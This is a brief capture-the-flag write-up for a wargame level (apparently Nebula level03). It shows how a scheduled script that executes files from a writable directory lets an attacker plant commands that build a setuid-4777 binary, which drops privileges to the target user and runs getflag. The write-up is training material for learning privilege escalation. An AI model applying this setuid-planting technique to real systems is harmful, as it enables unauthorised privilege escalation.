# Level 03

As the site say there is a script in the directory "/home/flag03" called
writable.sh:

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

In this case if we create a script and save it in the writable.d directory, at
some time it will be execute, by hte user flag03.

```bash
gcc -o /home/flag03/getflag /home/level03/getflag.c
chmod 4777 /home/flag03/getflag
```

We save this script in "/home/flag03/writable.d" directory.

Then we can create the code for our exploit in the "/home/level03" directory, that
will call the getflag function.

I use the same code of the level01.

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/getflag");
}
```

Then after some time our code will be call and execute and we can run our getflag.
